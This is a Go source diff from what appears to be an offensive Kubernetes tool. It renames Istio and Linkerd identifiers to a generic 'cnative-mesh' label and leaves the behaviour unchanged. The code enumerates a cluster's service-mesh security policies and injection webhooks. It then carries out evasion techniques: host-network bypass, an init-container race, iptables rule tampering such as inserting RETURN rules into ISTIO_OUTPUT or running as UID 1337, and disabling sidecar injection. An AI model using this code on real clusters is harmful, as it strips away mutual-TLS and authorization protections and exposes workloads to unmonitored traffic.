@@ -11,43 +11,43 @@ import (
 	"k8s.io/client-go/kubernetes"
 )
 
-var istioPeerAuthGVR = schema.GroupVersionResource{
+var cnativeMeshPeerAuthGVR = schema.GroupVersionResource{
 	Group: "security.istio.io", Version: "v1beta1", Resource: "peerauthentications",
 }
 
-var istioAuthzPolicyGVR = schema.GroupVersionResource{
+var cnativeMeshAuthzPolicyGVR = schema.GroupVersionResource{
 	Group: "security.istio.io", Version: "v1beta1", Resource: "authorizationpolicies",
 }
 
-var linkerdServerAuthGVR = schema.GroupVersionResource{
+var cnativeMeshServerAuthGVR = schema.GroupVersionResource{
 	Group: "policy.linkerd.io", Version: "v1beta1", Resource: "serverauthorizations",
 }
 
-func detectMeshSecurity(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) []DetectionSystem {
+func detectCnativeMesh(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface) []DetectionSystem {
 	var results []DetectionSystem
 
-	peerAuths, err := dynClient.Resource(istioPeerAuthGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	peerAuths, err := dynClient.Resource(cnativeMeshPeerAuthGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err == nil && len(peerAuths.Items) > 0 {
 		results = append(results, DetectionSystem{
-			Name:     "istio-security",
+			Name:     "cnative-mesh-security",
 			Detected: true,
 			Details:  fmt.Sprintf("%d PeerAuthentication policies", len(peerAuths.Items)),
 		})
 	}
 
-	authzPolicies, err := dynClient.Resource(istioAuthzPolicyGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	authzPolicies, err := dynClient.Resource(cnativeMeshAuthzPolicyGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err == nil && len(authzPolicies.Items) > 0 {
 		results = append(results, DetectionSystem{
-			Name:     "istio-authz",
+			Name:     "cnative-mesh-authz",
 			Detected: true,
 			Details:  fmt.Sprintf("%d AuthorizationPolicy resources", len(authzPolicies.Items)),
 		})
 	}
 
-	serverAuths, err := dynClient.Resource(linkerdServerAuthGVR).Namespace("").List(ctx, metav1.ListOptions{})
+	serverAuths, err := dynClient.Resource(cnativeMeshServerAuthGVR).Namespace("").List(ctx, metav1.ListOptions{})
 	if err == nil && len(serverAuths.Items) > 0 {
 		results = append(results, DetectionSystem{
-			Name:     "linkerd-authz",
+			Name:     "cnative-mesh-serverauth",
 			Detected: true,
 			Details:  fmt.Sprintf("%d ServerAuthorization policies", len(serverAuths.Items)),
 		})
@@ -62,7 +62,7 @@ func detectMeshSecurity(ctx context.Context, client kubernetes.Interface, dynCli
 					ns = wh.Webhooks[0].ClientConfig.Service.Namespace
 				}
 				results = append(results, DetectionSystem{
-					Name:      "mesh-injection",
+					Name:      "cnative-mesh-injection",
 					Detected:  true,
 					Namespace: ns,
 					Details:   fmt.Sprintf("sidecar injection webhook: %s", wh.Name),
@@ -74,25 +74,25 @@ func detectMeshSecurity(ctx context.Context, client kubernetes.Interface, dynCli
 	return results
 }
 
-// EvadeServiceMesh executes the specified service mesh security evasion technique.
-func EvadeServiceMesh(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
+// EvadeCnativeMesh executes the specified cnative-mesh security evasion technique.
+func EvadeCnativeMesh(ctx context.Context, client kubernetes.Interface, dynClient dynamic.Interface, technique string) (*EvasionResult, error) {
 	switch technique {
 	case "host_network":
-		return meshHostNetwork(ctx, client)
+		return cnativeMeshHostNetwork(ctx, client)
 	case "init_race":
-		return meshInitRace(ctx, client)
+		return cnativeMeshInitRace(ctx, client)
 	case "iptables_bypass":
-		return meshIptablesBypass(ctx, client)
+		return cnativeMeshIptablesBypass(ctx, client)
 	case "disable_injection":
-		return meshDisableInjection(ctx, client)
+		return cnativeMeshDisableInjection(ctx, client)
 	default:
-		return meshHostNetwork(ctx, client)
+		return cnativeMeshHostNetwork(ctx, client)
 	}
 }
 
-func meshHostNetwork(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+func cnativeMeshHostNetwork(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Service Mesh Host Network Bypass:\n\n")
+	sb.WriteString("cnative-mesh Host Network Bypass:\n\n")
 
 	sb.WriteString("  Sidecar proxies intercept traffic via iptables rules in the pod network namespace.\n")
 	sb.WriteString("  Pods with hostNetwork: true bypass the pod network namespace entirely.\n")
@@ -135,9 +135,9 @@ func meshHostNetwork(ctx context.Context, client kubernetes.Interface) (*Evasion
 	}, nil
 }
 
-func meshInitRace(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+func cnativeMeshInitRace(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Service Mesh Init Container Race:\n\n")
+	sb.WriteString("cnative-mesh Init Container Race:\n\n")
 
 	sb.WriteString("  Sidecar injection uses init containers (istio-init/linkerd-init)\n")
 	sb.WriteString("  that set up iptables rules BEFORE the app container starts.\n")
@@ -158,7 +158,7 @@ func meshInitRace(ctx context.Context, client kubernetes.Interface) (*EvasionRes
 	if err == nil {
 		for _, wh := range webhooks.Items {
 			if strings.Contains(wh.Name, "istio") {
-				sb.WriteString("  Istio injection mode detected\n")
+				sb.WriteString("  cnative-mesh injection mode detected\n")
 				for _, hook := range wh.Webhooks {
 					if hook.NamespaceSelector != nil {
 						fmt.Fprintf(&sb, "    Selector: %v\n", hook.NamespaceSelector.MatchLabels)
@@ -168,15 +168,15 @@ func meshInitRace(ctx context.Context, client kubernetes.Interface) (*EvasionRes
 		}
 	}
 
-	sb.WriteString("\n  Istio CNI mode check:\n")
+	sb.WriteString("\n  cnative-mesh CNI mode check:\n")
 	ds, err := client.AppsV1().DaemonSets("").List(ctx, metav1.ListOptions{
 		LabelSelector: "k8s-app=istio-cni-node",
 	})
 	if err == nil && len(ds.Items) > 0 {
-		sb.WriteString("    [+] Istio CNI mode active — init container race is wider\n")
+		sb.WriteString("    [+] cnative-mesh CNI mode active — init container race is wider\n")
 		sb.WriteString("    CNI plugin adds rules asynchronously via DaemonSet\n")
 	} else {
-		sb.WriteString("    Istio using init container mode (istio-init)\n")
+		sb.WriteString("    cnative-mesh using init container mode (istio-init)\n")
 		sb.WriteString("    Race window is smaller but still exploitable\n")
 	}
 
@@ -187,9 +187,9 @@ func meshInitRace(ctx context.Context, client kubernetes.Interface) (*EvasionRes
 	}, nil
 }
 
-func meshIptablesBypass(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+func cnativeMeshIptablesBypass(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Service Mesh iptables Bypass:\n\n")
+	sb.WriteString("cnative-mesh iptables Bypass:\n\n")
 
 	sb.WriteString("  Sidecar proxies rely on iptables REDIRECT/TPROXY rules.\n")
 	sb.WriteString("  With NET_ADMIN or sufficient privileges, these rules can be modified.\n\n")
@@ -208,7 +208,7 @@ func meshIptablesBypass(ctx context.Context, client kubernetes.Interface) (*Evas
 	sb.WriteString("       iptables -t nat -I ISTIO_OUTPUT -d <target> -j RETURN\n\n")
 	sb.WriteString("    3. Use specific UID to bypass (envoy runs as UID 1337):\n")
 	sb.WriteString("       Run process as UID 1337 → iptables rules skip envoy's own traffic\n\n")
-	sb.WriteString("    4. Bind to 127.0.0.6 (Istio's internal passthrough address)\n\n")
+	sb.WriteString("    4. Bind to 127.0.0.6 (cnative-mesh's internal passthrough address)\n\n")
 
 	pods, err := client.CoreV1().Pods("").List(ctx, metav1.ListOptions{Limit: 20})
 	if err == nil {
@@ -240,9 +240,9 @@ func meshIptablesBypass(ctx context.Context, client kubernetes.Interface) (*Evas
 	}, nil
 }
 
-func meshDisableInjection(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
+func cnativeMeshDisableInjection(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
 	var sb strings.Builder
-	sb.WriteString("Service Mesh Injection Disable:\n\n")
+	sb.WriteString("cnative-mesh Injection Disable:\n\n")
 
 	webhooks, err := client.AdmissionregistrationV1().MutatingWebhookConfigurations().List(ctx, metav1.ListOptions{})
 	if err != nil {
